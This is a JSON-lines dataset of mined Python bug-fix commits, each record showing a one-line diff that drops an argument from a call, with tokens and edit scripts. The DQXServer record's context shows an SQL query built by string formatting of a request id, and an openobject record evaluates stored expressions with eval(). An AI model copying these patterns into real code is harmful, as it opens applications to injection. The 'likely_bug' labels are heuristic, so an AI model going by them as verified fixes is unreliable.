{"project": "google-cloud-python", "commit_sha": "95a0ccc3267abb3ce31fdb3b2039ea54ed1783cc", "parent_sha": "cb77bb6929c0effa688fd2224e9551a74083ff98", "file_path": "gcloud/pubsub/test_subscription.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/google-cloud-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -138,7 +138,7 @@ class TestSubscription(unittest2.TestCase):\n         SUB_FULL = 'projects/%s/subscriptions/%s' % (PROJECT, SUB_NAME)\n         SUB_PATH = '/%s' % (SUB_FULL,)\n         TOPIC_NAME = 'topic_name'\n-        CLIENT = _Client(project=PROJECT, connection=None)\n+        CLIENT = _Client(project=PROJECT)\n         topic = _Topic(TOPIC_NAME, client=CLIENT)\n         subscription = self._makeOne(SUB_NAME, topic)\n         self.assertEqual(subscription.full_name, SUB_FULL)\n", "before": "CLIENT = _Client ( project = PROJECT , connection = None )", "after": "CLIENT = _Client ( project = PROJECT )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 41, 3, 42]], [\"Delete\", [\"identifier:connection\", 3, 43, 3, 53]], [\"Delete\", [\"=:=\", 3, 53, 3, 54]], [\"Delete\", [\"none:None\", 3, 54, 3, 58]], [\"Delete\", [\"keyword_argument\", 3, 43, 3, 58]]]"}
{"project": "django-mama-cas", "commit_sha": "c35be2ca59d6d3dd61fdf1c6b4c6e14fde881b8f", "parent_sha": "fb6d5ba71aa2fd81710ef81d765e79cf6b855abd", "file_path": "mama_cas/views.py", "project_url": "https://github.com/CodeArtLibs/django-mama-cas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -201,7 +201,7 @@ class LogoutView(NeverCacheMixin, LogoutUserMixin, View):\n     def get(self, request, *args, **kwargs):\n         logger.debug(\"Logout request received for %s\" % request.user)\n         self.logout_user(request)\n-        url = request.GET.get('url', None)\n+        url = request.GET.get('url')\n         if url and is_valid_service_url(url):\n             if getattr(settings, 'MAMA_CAS_FOLLOW_LOGOUT_URL', False):\n                 return redirect(url)\n", "before": "url = request . GET . get ( 'url' , None )", "after": "url = request . GET . get ( 'url' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 36, 3, 37]], [\"Delete\", [\"none:None\", 3, 38, 3, 42]]]"}
{"project": "wal-e", "commit_sha": "e4eac01dda4fa2810dad83e92738cc6803e5b9f1", "parent_sha": "eae8d4670e0073d31b5a47fd6c069c699536febb", "file_path": "wal_e/storage/wabs_storage.py", "project_url": "https://github.com/cybera/wal-e", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ class WABSBackupInfo(BackupInfo):\n             bucket=self.layout.store_name(),\n             path=self.layout.basebackup_sentinel(self))\n         from wal_e.blobstore import wabs\n-        data = wabs.uri_get_file(None, None, uri, conn=conn)\n+        data = wabs.uri_get_file(None, uri, conn=conn)\n         data = json.loads(data)\n         for (k, v) in data.items():\n             setattr(self, k, v)\n", "before": "data = wabs . uri_get_file ( None , None , uri , conn = conn )", "after": "data = wabs . uri_get_file ( None , uri , conn = conn )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"none:None\", 3, 40, 3, 44]], [\"Delete\", [\",:,\", 3, 44, 3, 45]]]"}
{"project": "bcbio-nextgen", "commit_sha": "708d25f3837ac6930bbbb8bea3e9016a0c4e40cd", "parent_sha": "29194ff08e3b349e97912d837f7b1b6dac1c657b", "file_path": "bcbio/ngsalign/novoalign.py", "project_url": "https://github.com/tenxcloud/bcbio-nextgen", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ def _novoalign_args_from_config(config, need_quality=True):\n         qual_flags = [\"-F\", \"ILMFQ\" if qual_format == \"illumina\" else \"STDFQ\"]\n     else:\n         qual_flags = []\n-    multi_mappers = config[\"algorithm\"].get(\"multiple_mappers\", True)\n+    multi_mappers = config[\"algorithm\"].get(\"multiple_mappers\")\n     if multi_mappers is True:\n         multi_flag = \"Random\"\n     elif isinstance(multi_mappers, basestring):\n", "before": "multi_mappers = config [ \"algorithm\" ] . get ( \"multiple_mappers\" , True )", "after": "multi_mappers = config [ \"algorithm\" ] . get ( \"multiple_mappers\" )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 63, 3, 64]], [\"Delete\", [\"true:True\", 3, 65, 3, 69]]]"}
{"project": "fabtools", "commit_sha": "bb60a5ab60291a2ac378404be30db89d8aa6798b", "parent_sha": "37ebf3ea00da01925bad608d4acc336da58ebbbf", "file_path": "fabtools/tests/fabfiles/python.py", "project_url": "https://github.com/urbn/fabtools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,6 +29,6 @@ def python_package():\n \n     require.python.virtualenv('/tmp/venv')\n     with fabtools.python.virtualenv('/tmp/venv'):\n-        require.python.package('fabric', download_cache='/var/cache/pip')\n+        require.python.package('fabric')\n \n     assert fabtools.files.is_file('/tmp/venv/bin/fab')\n", "before": "require . python . package ( 'fabric' , download_cache = '/var/cache/pip' )", "after": "require . python . package ( 'fabric' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 40, 3, 41]], [\"Delete\", [\"identifier:download_cache\", 3, 42, 3, 56]], [\"Delete\", [\"=:=\", 3, 56, 3, 57]], [\"Delete\", [\"string:'/var/cache/pip'\", 3, 57, 3, 73]], [\"Delete\", [\"keyword_argument\", 3, 42, 3, 73]]]"}
{"project": "TheLMA", "commit_sha": "ab246997f1eb7707c3de72c295cfa096bcb28549", "parent_sha": "b2f65cfc5f4d64f88f581f65c8024513bb424539", "file_path": "thelma/tests/tools/test_logging.py", "project_url": "https://github.com/helixyte/TheLMA", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class _EventRecordingExampleClass(EventRecording):\n \n \n     def __init__(self):\n-        EventRecording.__init__(self, TestingLog(), logging.WARNING, False)\n+        EventRecording.__init__(self, TestingLog())\n         self.nested = None\n \n     def run(self):\n", "before": "EventRecording . __init__ ( self , TestingLog ( ) , logging . WARNING , False )", "after": "EventRecording . __init__ ( self , TestingLog ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 51, 3, 52]], [\"Delete\", [\"identifier:logging\", 3, 53, 3, 60]], [\"Delete\", [\".:.\", 3, 60, 3, 61]], [\"Delete\", [\"identifier:WARNING\", 3, 61, 3, 68]], [\"Delete\", [\"attribute\", 3, 53, 3, 68]], [\"Delete\", [\",:,\", 3, 68, 3, 69]], [\"Delete\", [\"false:False\", 3, 70, 3, 75]]]"}
{"project": "springboard-iogt", "commit_sha": "6797453c3a01198381697ac6a5249b2e0771e55d", "parent_sha": "06284eb4574c088355d655d1ae3ec8db53cecb66", "file_path": "springboard_iogt/tests/test_views.py", "project_url": "https://github.com/universalcore/springboard-iogt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class TestIoGTViews(SpringboardTestCase):\n         app = self.mk_app(self.workspace, main=main)\n         app.set_cookie(PERSONA_COOKIE_NAME, PERSONA_SKIP_COOKIE_VALUE)\n \n-        response = app.get('/', )\n+        response = app.get('/')\n         self.assertEqual(response.status_int, 200)\n         html = response.html\n         re_page_url = re.compile(r'/page/.{32}/')\n", "before": "response = app . get ( '/' , )", "after": "response = app . get ( '/' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 31, 3, 32]]]"}
{"project": "gammapy-benchmarks", "commit_sha": "cd3df49d257693ffa1071347b3068374848b8284", "parent_sha": "edbfda48de7e792b6341340ef8a2df6b0d47b199", "file_path": "validation/event-sampling/make.py", "project_url": "https://github.com/gammapy/gammapy-benchmarks", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -533,7 +533,7 @@ def plot_residual_distribution(dataset, obs_id, livetime):\n         log.info(f\"SkyDiffuseCube: no spectral model to plot\")\n     else:\n         lima = ts(model=model, kernel_width=\"0.1 deg\")\n-        l_m = lima.run(dataset, steps=[\"ts\", \"sqrt_ts\", \"flux\", \"niter\"])\n+        l_m = lima.run(dataset)\n         sig_resid = l_m[\"sqrt_ts\"].data[np.isfinite(l_m[\"sqrt_ts\"].data)]\n \n         # tophat_2D_kernel = Tophat2DKernel(5)\n", "before": "l_m = lima . run ( dataset , steps = [ \"ts\" , \"sqrt_ts\" , \"flux\" , \"niter\" ] )", "after": "l_m = lima . run ( dataset )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 31, 3, 32]], [\"Delete\", [\"identifier:steps\", 3, 33, 3, 38]], [\"Delete\", [\"=:=\", 3, 38, 3, 39]], [\"Delete\", [\"[:[\", 3, 39, 3, 40]], [\"Delete\", [\"string:\\\"ts\\\"\", 3, 40, 3, 44]], [\"Delete\", [\",:,\", 3, 44, 3, 45]], [\"Delete\", [\"string:\\\"sqrt_ts\\\"\", 3, 46, 3, 55]], [\"Delete\", [\",:,\", 3, 55, 3, 56]], [\"Delete\", [\"string:\\\"flux\\\"\", 3, 57, 3, 63]], [\"Delete\", [\",:,\", 3, 63, 3, 64]], [\"Delete\", [\"string:\\\"niter\\\"\", 3, 65, 3, 72]], [\"Delete\", [\"]:]\", 3, 72, 3, 73]], [\"Delete\", [\"list\", 3, 39, 3, 73]], [\"Delete\", [\"keyword_argument\", 3, 33, 3, 73]]]"}
{"project": "openobject-server", "commit_sha": "9f1700035d8a790792509a4c1ea923bb5562ba80", "parent_sha": "08b084279e4beb7ee11c52e7ad0da3e86bbd6d1d", "file_path": "openerp/wizard/__init__.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class interface(netsvc.Service):\n         _logger.warning(\n             \"The wizard %s uses the deprecated openerp.wizard.interface class.\\n\"\n             \"It must use the openerp.osv.TransientModel class instead.\" % \\\n-            name, DeprecationWarning, stacklevel=3)\n+            name)\n         super(interface, self).__init__('wizard.'+name)\n         self.wiz_name = name\n \n", "before": "_logger . warning ( \"The wizard %s uses the deprecated openerp.wizard.interface class.\\n\" \"It must use the openerp.osv.TransientModel class instead.\" % name , DeprecationWarning , stacklevel = 3 )", "after": "_logger . warning ( \"The wizard %s uses the deprecated openerp.wizard.interface class.\\n\" \"It must use the openerp.osv.TransientModel class instead.\" % name )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 17, 3, 18]], [\"Delete\", [\"identifier:DeprecationWarning\", 3, 19, 3, 37]], [\"Delete\", [\",:,\", 3, 37, 3, 38]], [\"Delete\", [\"identifier:stacklevel\", 3, 39, 3, 49]], [\"Delete\", [\"=:=\", 3, 49, 3, 50]], [\"Delete\", [\"integer:3\", 3, 50, 3, 51]], [\"Delete\", [\"keyword_argument\", 3, 39, 3, 51]]]"}
{"project": "openobject-server", "commit_sha": "bba279443b0136003ce30c60bb9b4395b5e64bcd", "parent_sha": "4e40a345ee2b9ac5129dc6ac2b51030680331e16", "file_path": "bin/osv/orm.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3891,7 +3891,7 @@ class orm(orm_template):\n         else:\n             # extract the field names, to be able to qualify them and add desc/asc\n             m2o_order_list = []\n-            for order_part in m2o_order.split(\",\",1):\n+            for order_part in m2o_order.split(\",\"):\n                 m2o_order_list.append(order_part.strip().split(\" \",1)[0].strip())\n             m2o_order = m2o_order_list\n \n", "before": "for order_part in m2o_order . split ( \",\" , 1 ) : m2o_order_list . append ( order_part . strip ( ) . split ( \" \" , 1 ) [ 0 ] . strip ( ) )", "after": "for order_part in m2o_order . split ( \",\" ) : m2o_order_list . append ( order_part . strip ( ) . split ( \" \" , 1 ) [ 0 ] . strip ( ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 50, 3, 51]], [\"Delete\", [\"integer:1\", 3, 51, 3, 52]]]"}
{"project": "openobject-server", "commit_sha": "ae5ac54be31e4c0662c2af14f5417253cec3fe5e", "parent_sha": "915035f1252287887f6ae07b336f8bcd4f723fed", "file_path": "openerp/addons/base/ir/ir_model.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ class ir_model(osv.osv):\n             pass\n         x_custom_model._name = model\n         x_custom_model._module = False\n-        a = x_custom_model.createInstance(self.pool, '', cr)\n+        a = x_custom_model.createInstance(self.pool, cr)\n         if (not a._columns) or ('x_name' in a._columns.keys()):\n             x_name = 'x_name'\n         else:\n", "before": "a = x_custom_model . createInstance ( self . pool , '' , cr )", "after": "a = x_custom_model . createInstance ( self . pool , cr )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:''\", 3, 54, 3, 56]], [\"Delete\", [\",:,\", 3, 56, 3, 57]]]"}
{"project": "lucid-pyton", "commit_sha": "c81982f3427652ca009ad101eb5635eef8dc3ae5", "parent_sha": "ccf35a83260c311aa6507defe2cb1df5ad4f6727", "file_path": "lSdaCommon.py", "project_url": "https://github.com/o19s/lucid-pyton", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class LucidSdaConfiguration(object):\n class LucidCollConfiguration(LucidSdaConfiguration):\n     \"\"\" Collection knowing configuration\"\"\"\n     def __init__(self, collectionName, url, httpAuth):\n-        super(LucidCollConfiguration, self).__init__(url, httpAuth, None)\n+        super(LucidCollConfiguration, self).__init__(url, httpAuth)\n         self.collectionName = collectionName\n \n     @staticmethod\n", "before": "super ( LucidCollConfiguration , self ) . __init__ ( url , httpAuth , None )", "after": "super ( LucidCollConfiguration , self ) . __init__ ( url , httpAuth )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 67, 3, 68]], [\"Delete\", [\"none:None\", 3, 69, 3, 73]]]"}
{"project": "openobject-server", "commit_sha": "eee65763bdd30eb0490de9e89c59d5404396d230", "parent_sha": "81b0f018e3556b0e9105f2eae1171db3f4139de5", "file_path": "bin/service/web_services.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -623,7 +623,7 @@ class wizard(netsvc.ExportService):\n \t\traise KeyError(\"Method not supported %s\" % method)\n \tsecurity.check(db,uid,passwd)\n \tfn = getattr(self, 'exp_'+method)\n-\tres = fn(ls, db, uid, *params)\n+\tres = fn(db, uid, *params)\n \treturn res\n \t\n     def new_dispatch(self,method,auth,params):\n", "before": "res = fn ( ls , db , uid , * params )", "after": "res = fn ( db , uid , * params )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:ls\", 3, 11, 3, 13]], [\"Delete\", [\",:,\", 3, 13, 3, 14]]]"}
{"project": "openobject-server", "commit_sha": "abb3d8b929d8f2ec1461298bf2d8721cb2171fdf", "parent_sha": "95b7ebaefe66de6891055653f820020316390b0a", "file_path": "openerp/addons/base/res/res_partner.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -435,7 +435,7 @@ class res_partner(osv.osv):\n     def default_get(self, cr, uid, fields, context=None):\n         res =  super(res_partner, self).default_get( cr, uid, fields, context)\n         if 'is_company' in res:\n-            res.update({'photo': self._get_photo(self, cr, uid, res.get('is_company', 'contact'), context)})\n+            res.update({'photo': self._get_photo(cr, uid, res.get('is_company', 'contact'), context)})\n         return res\n \n res_partner()\n", "before": "res . update ( { 'photo' : self . _get_photo ( self , cr , uid , res . get ( 'is_company' , 'contact' ) , context ) } )", "after": "res . update ( { 'photo' : self . _get_photo ( cr , uid , res . get ( 'is_company' , 'contact' ) , context ) } )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 50, 3, 54]], [\"Delete\", [\",:,\", 3, 54, 3, 55]]]"}
{"project": "openobject-server", "commit_sha": "286bce78cfc54591f727be9e44b836dca70e7002", "parent_sha": "054277aa08189ecd5e0ce9327bb4489e90aa0a40", "file_path": "bin/osv/fields.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -882,7 +882,7 @@ class property(function):\n     def _get_defaults(self, obj, cr, uid, prop_name, context=None):\n         prop = obj.pool.get('ir.property')\n         domain = [('fields_id.model', '=', obj._name), ('fields_id.name','in',prop_name), ('res_id','=',False)]\n-        ids = prop.search(cr, uid, domain, order='company_id', context=context)\n+        ids = prop.search(cr, uid, domain, context=context)\n         replaces = {}\n         default_value = {}.fromkeys(prop_name, False)\n         for prop_rec in prop.browse(cr, uid, ids, context=context):\n", "before": "ids = prop . search ( cr , uid , domain , order = 'company_id' , context = context )", "after": "ids = prop . search ( cr , uid , domain , context = context )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:order\", 3, 44, 3, 49]], [\"Delete\", [\"=:=\", 3, 49, 3, 50]], [\"Delete\", [\"string:'company_id'\", 3, 50, 3, 62]], [\"Delete\", [\"keyword_argument\", 3, 44, 3, 62]], [\"Delete\", [\",:,\", 3, 62, 3, 63]]]"}
{"project": "zipline", "commit_sha": "ec441c55eaef684b994db2313ebcd428eaffc0ca", "parent_sha": "8c53d49d40bb9faa08724bc7586f9f865496b9b9", "file_path": "zipline/utils/calendars/trading_calendar.py", "project_url": "https://github.com/infsum/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -824,4 +824,4 @@ def _overwrite_special_dates(midnight_utcs,\n \n class HolidayCalendar(AbstractHolidayCalendar):\n     def __init__(self, rules):\n-        super(HolidayCalendar, self).__init__(self, rules=rules)\n+        super(HolidayCalendar, self).__init__(rules=rules)\n", "before": "super ( HolidayCalendar , self ) . __init__ ( self , rules = rules )", "after": "super ( HolidayCalendar , self ) . __init__ ( rules = rules )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 47, 3, 51]], [\"Delete\", [\",:,\", 3, 51, 3, 52]]]"}
{"project": "openobject-server", "commit_sha": "62c182e6b6f983ba0fcb1bb8e6c25ebb8fb010c5", "parent_sha": "194f7a24077c5c4ead5a9dc20a3fcf12082cbf47", "file_path": "openerp/addons/base/res/res_company.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class res_company(osv.osv):\n         ]\n \n         ids = proxy.search(cr, uid, args, context=context)\n-        user = self.pool.get('res.users').browse(cr, SUPERUSER_ID, uid, ['company_id'], context=context)\n+        user = self.pool.get('res.users').browse(cr, SUPERUSER_ID, uid, context=context)\n         for rule in proxy.browse(cr, uid, ids, context):\n             if eval(rule.expression, {'context': context, 'user': user}):\n                 return rule.company_dest_id.id\n", "before": "user = self . pool . get ( 'res.users' ) . browse ( cr , SUPERUSER_ID , uid , [ 'company_id' ] , context = context )", "after": "user = self . pool . get ( 'res.users' ) . browse ( cr , SUPERUSER_ID , uid , context = context )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"[:[\", 3, 73, 3, 74]], [\"Delete\", [\"string:'company_id'\", 3, 74, 3, 86]], [\"Delete\", [\"]:]\", 3, 86, 3, 87]], [\"Delete\", [\"list\", 3, 73, 3, 87]], [\"Delete\", [\",:,\", 3, 87, 3, 88]]]"}
{"project": "DQXServer", "commit_sha": "9524c23b9826bb3682b8fa700d1f559d0b38137d", "parent_sha": "0e59c38eee12f0a38a44156a2e8f910195687f55", "file_path": "responders/fetchstoredata.py", "project_url": "https://github.com/cggh/DQXServer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ import config\n \n def response(returndata):\n     id = returndata['id']\n-    with DQXDbTools.DBCursor(returndata, databaseName) as cur:\n+    with DQXDbTools.DBCursor(returndata) as cur:\n         sqlstring = 'SELECT content FROM storage WHERE id=\"{0}\"'.format(id)\n         cur.execute(sqlstring)\n \n", "before": "with DQXDbTools . DBCursor ( returndata , databaseName ) as cur : sqlstring = 'SELECT content FROM storage WHERE id=\"{0}\"' . format ( id ) cur . execute ( sqlstring )", "after": "with DQXDbTools . DBCursor ( returndata ) as cur : sqlstring = 'SELECT content FROM storage WHERE id=\"{0}\"' . format ( id ) cur . execute ( sqlstring )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 40, 3, 41]], [\"Delete\", [\"identifier:databaseName\", 3, 42, 3, 54]]]"}
{"project": "crypto-trader-bot", "commit_sha": "8244990e2d9bf3f7ed9eeb7b5df547848b8ec313", "parent_sha": "a5d4743a47930d95f70da1198a7473be05e90148", "file_path": "src/algo/ro_cano_che_ritorna.py", "project_url": "https://github.com/renasboy/crypto-trader-bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class ro_cano_che_ritorna(object):\n         price = self.algo_helper.price\n         prev_price = self.algo_helper.prev_price\n         \n-        prev_price_2_min_ago = self.algo_helper.prev_price_minutes_ago(prev_price, 2)\n+        prev_price_2_min_ago = self.algo_helper.prev_price_minutes_ago(2)\n         \n         \n         #VENDE DOPO 100 minuti (TEMPO DOPO IL QUALE ro cano ritorna a casa) ( 100 minuti = 100 * 60 = 6000 secondi ) ) (\"E SE\" ma7 < ma7 3 min ago)\n", "before": "prev_price_2_min_ago = self . algo_helper . prev_price_minutes_ago ( prev_price , 2 )", "after": "prev_price_2_min_ago = self . algo_helper . prev_price_minutes_ago ( 2 )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:prev_price\", 3, 72, 3, 82]], [\"Delete\", [\",:,\", 3, 82, 3, 83]]]"}
{"project": "openedx-census", "commit_sha": "3b5ef355e17c3b97a0a7708098a1eac2487444d5", "parent_sha": "8b676db23d4848ae36a6fef8b63210863b654d56", "file_path": "sites.py", "project_url": "https://github.com/edx/openedx-census", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ async def gacco_parser(site, session):\n @matches(r\"doroob.sa$\")\n async def doroob_parser(site, session):\n     url = \"https://www.doroob.sa/ar/individuals/elearning/\"\n-    text = await session.text_from_url(url, save=True)\n+    text = await session.text_from_url(url)\n     elts = elements_by_css(text, \".courses-listing-item\")\n     count = len(elts)\n     return count\n", "before": "text = await session . text_from_url ( url , save = True )", "after": "text = await session . text_from_url ( url )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 43, 3, 44]], [\"Delete\", [\"identifier:save\", 3, 45, 3, 49]], [\"Delete\", [\"=:=\", 3, 49, 3, 50]], [\"Delete\", [\"true:True\", 3, 50, 3, 54]], [\"Delete\", [\"keyword_argument\", 3, 45, 3, 54]]]"}
{"project": "theHarvester", "commit_sha": "e3e10310b3c74d657e8b2e763dcb5b115dc145b5", "parent_sha": "4d48dcbb340faff2064aea787e0dc0b86f6b3c0a", "file_path": "theHarvester/lib/core.py", "project_url": "https://github.com/rvrsh3ll/theHarvester", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -435,7 +435,7 @@ class AsyncFetcher:\n                     async with session.get(url, params=params, proxy=proxy) as response:\n                         return await response.text() if json is False else await response.json()\n                 else:\n-                    async with session.get(url, proxy=proxy) as response:\n+                    async with session.get(url) as response:\n                         await asyncio.sleep(2)\n                         return await response.text() if json is False else await response.json()\n \n", "before": "with session . get ( url , proxy = proxy ) as response : await asyncio . sleep ( 2 ) return await response . text ( ) if json is False else await response . json ( )", "after": "with session . get ( url ) as response : await asyncio . sleep ( 2 ) return await response . text ( ) if json is False else await response . json ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 47, 3, 48]], [\"Delete\", [\"identifier:proxy\", 3, 49, 3, 54]], [\"Delete\", [\"=:=\", 3, 54, 3, 55]], [\"Delete\", [\"identifier:proxy\", 3, 55, 3, 60]], [\"Delete\", [\"keyword_argument\", 3, 49, 3, 60]]]"}
{"project": "theHarvester", "commit_sha": "242c0657ede5b70d01e4378ccc80f75f44720466", "parent_sha": "5aae4510cb89dcdbfab7c2baac7de94955d13c74", "file_path": "theHarvester/__main__.py", "project_url": "https://github.com/rvrsh3ll/theHarvester", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -269,7 +269,7 @@\n                     from theHarvester.discovery import intelxsearch\n                     # Import locally or won't work.\n                     try:\n-                        intelx_search = intelxsearch.SearchIntelx(word, limit)\n+                        intelx_search = intelxsearch.SearchIntelx(word)\n                         stor_lst.append(store(intelx_search, engineitem, store_host=True, store_emails=True))\n                     except Exception as e:\n                         if isinstance(e, MissingKey):\n", "before": "intelx_search = intelxsearch . SearchIntelx ( word , limit )", "after": "intelx_search = intelxsearch . SearchIntelx ( word )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 71, 3, 72]], [\"Delete\", [\"identifier:limit\", 3, 73, 3, 78]]]"}
{"project": "less-tabs", "commit_sha": "4e2e370409e05fafc78ae60be4f54e719bdf3200", "parent_sha": "65190874f7d75b05b2501af3580bab1768ac0f2d", "file_path": "main/control/user.py", "project_url": "https://github.com/topless/less-tabs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -344,7 +344,7 @@ def user_merge():\n       merged_user_db=merged_user_db,\n       form=form,\n       auth_ids=auth_ids,\n-      api_url=flask.url_for('api.admin.user.list', user_keys=','.join(user_keys)),\n+      api_url=flask.url_for('api.admin.user.list'),\n     )\n \n \n", "before": "form = form , auth_ids = auth_ids , api_url = flask . url_for ( 'api.admin.user.list' , user_keys = ',' . join ( user_keys ) ) ,", "after": "form = form , auth_ids = auth_ids , api_url = flask . url_for ( 'api.admin.user.list' ) ,", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 28, 3, 82], [\"):)\", 3, 80, 3, 81], 2], [\"Delete\", [\",:,\", 3, 50, 3, 51]], [\"Delete\", [\"identifier:user_keys\", 3, 52, 3, 61]], [\"Delete\", [\"=:=\", 3, 61, 3, 62]], [\"Delete\", [\"string:','\", 3, 62, 3, 65]], [\"Delete\", [\".:.\", 3, 65, 3, 66]], [\"Delete\", [\"identifier:join\", 3, 66, 3, 70]], [\"Delete\", [\"attribute\", 3, 62, 3, 70]], [\"Delete\", [\"(:(\", 3, 70, 3, 71]], [\"Delete\", [\"identifier:user_keys\", 3, 71, 3, 80]], [\"Delete\", [\"argument_list\", 3, 70, 3, 81]], [\"Delete\", [\"call\", 3, 62, 3, 81]], [\"Delete\", [\"keyword_argument\", 3, 52, 3, 81]], [\"Delete\", [\"):)\", 3, 81, 3, 82]]]"}
{"project": "osf.io", "commit_sha": "98958211b401be84212f201c49869048542b15b8", "parent_sha": "02567d2593816dbffd378c0c69b93bd54017c34c", "file_path": "tests/api_tests/nodes/test_views.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -916,7 +916,7 @@ class TestCreateNodePointer(ApiTestCase):\n         res = self.app.post(self.public_url, self.public_payload, auth = self.basic_auth_two, expect_errors=True)\n         assert_equal(res.status_code, 403)\n \n-        res = self.app.post(self.public_url, self.public_payload, auth = self.basic_auth, expect_errors=True)\n+        res = self.app.post(self.public_url, self.public_payload, auth = self.basic_auth)\n         assert_equal(res.status_code, 201)\n         assert_equal(res.json['data']['node_id'], self.public_project._id)\n \n", "before": "res = self . app . post ( self . public_url , self . public_payload , auth = self . basic_auth , expect_errors = True )", "after": "res = self . app . post ( self . public_url , self . public_payload , auth = self . basic_auth )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 89, 3, 90]], [\"Delete\", [\"identifier:expect_errors\", 3, 91, 3, 104]], [\"Delete\", [\"=:=\", 3, 104, 3, 105]], [\"Delete\", [\"true:True\", 3, 105, 3, 109]], [\"Delete\", [\"keyword_argument\", 3, 91, 3, 109]]]"}
{"project": "osf.io", "commit_sha": "84ef84c6e06966ad16314ef669b490db292effe4", "parent_sha": "407993164e628cde3622f4ab4e52c98122205892", "file_path": "api/nodes/views.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1320,7 +1320,7 @@ class NodeLinksList(JSONAPIBaseView, bulk_views.BulkDestroyJSONAPIView, bulk_vie\n     # Overrides BulkDestroyJSONAPIView\n     def perform_destroy(self, instance):\n         auth = get_user_auth(self.request)\n-        node = self.get_node(delete=True)\n+        node = self.get_node()\n         try:\n             node.rm_pointer(instance, auth=auth)\n         except ValueError as err:  # pointer doesn't belong to node\n", "before": "node = self . get_node ( delete = True )", "after": "node = self . get_node ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:delete\", 3, 30, 3, 36]], [\"Delete\", [\"=:=\", 3, 36, 3, 37]], [\"Delete\", [\"true:True\", 3, 37, 3, 41]], [\"Delete\", [\"keyword_argument\", 3, 30, 3, 41]]]"}
